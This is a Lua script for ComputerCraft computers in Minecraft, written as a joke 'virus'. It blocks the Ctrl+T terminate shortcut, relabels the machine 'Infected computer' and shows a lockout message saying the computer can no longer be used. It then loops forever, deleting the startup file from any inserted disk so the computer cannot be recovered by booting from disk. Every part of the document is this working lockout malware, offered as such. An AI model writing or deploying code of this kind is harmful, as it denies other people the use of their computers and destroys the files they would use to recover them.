os.pullEvent = os.pullEventRaw
os.setComputerLabel("Infected computer")


term.setBackgroundColor(colors.blue)
term.clear()

function cPrint(string, y2)
	local tX, tY = term.getSize()
	local b = string.len(string) / 2
	local x = (tX / 2) - b
	local y = tY / 2
	
	if y2 then
		y = y2
	end

	term.setCursorPos(x, y)
	write(string)
end

term.setTextColor(colors.blue)
term.setBackgroundColor(colors.white)
cPrint("You are infected!")
term.setBackgroundColor(colors.blue)
term.setTextColor(colors.white)
cPrint("Now you can't use your computer", 10)
cPrint("Thank you for using virus!", 11)

while true do
	if fs.exists("disk") then
		fs.delete("disk/startup")
	end

	sleep(0.1)
end

